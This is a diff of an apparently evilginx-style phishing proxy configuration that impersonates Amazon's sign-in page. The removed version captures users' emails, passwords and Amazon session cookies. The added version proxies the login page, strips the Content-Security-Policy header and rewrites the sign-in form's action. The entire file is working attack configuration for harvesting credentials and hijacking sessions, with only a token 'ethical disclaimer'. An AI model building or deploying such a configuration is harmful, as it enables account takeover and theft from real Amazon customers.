@@ -1,21 +1,20 @@
-# VANTABLACK PROJECT | ETHICAL DISCLAIMER: USAGE AUTORISÉ UNIQUEMENT
-min_ver: '3.0.0'
+name: "Amazon-Login"
+author: "Vanta v5"
+min_ver: "5.0.0"
 proxy_hosts:
-  - {phish_sub: 'www', orig_sub: 'www', domain: 'amazon.com', session: true, is_landing: true}
-sub_filters:
-  - {triggers_on: 'www.amazon.com', orig_sub: 'www', domain: 'amazon.com', search: 'https://www.amazon.com/', replace: 'https://{hostname}/', mimes: ['text/html', 'application/javascript']}
-auth_tokens:
-  - domain: '.amazon.com'
-    keys: ['session-id', 'session-id-time', 'ubid-main', 'x-main', 'at-main', 'sess-at-main']
-credentials:
-  username:
-    key: 'email'
-    search: '(.*)'
-    type: 'post'
-  password:
-    key: 'password'
-    search: '(.*)'
-    type: 'post'
-login:
-  domain: 'www.amazon.com'
-  path: '/ap/signin'
+  - subdomain: "amazon"
+    target: "www.amazon.com"
+auth_urls: ["/ap/signin"]
+landing_path: ["/ap/signin"]
+auth_tokens: []
+credentials: []
+injections: []
+headers:
+  - {action: "remove", name: "Content-Security-Policy"}
+path_rewrites:
+  - {pattern: "^/$", replace: "/ap/signin", methods: ["GET"]}
+cookie_rewrites: []
+blocklist:
+  - {pattern: "images|/ads|/tagging", mimes: ["image/"], max_kb: 300}
+form_actions:
+  - {selector: "form[action*=\"signin\"]", action_to: "/ap/session"}
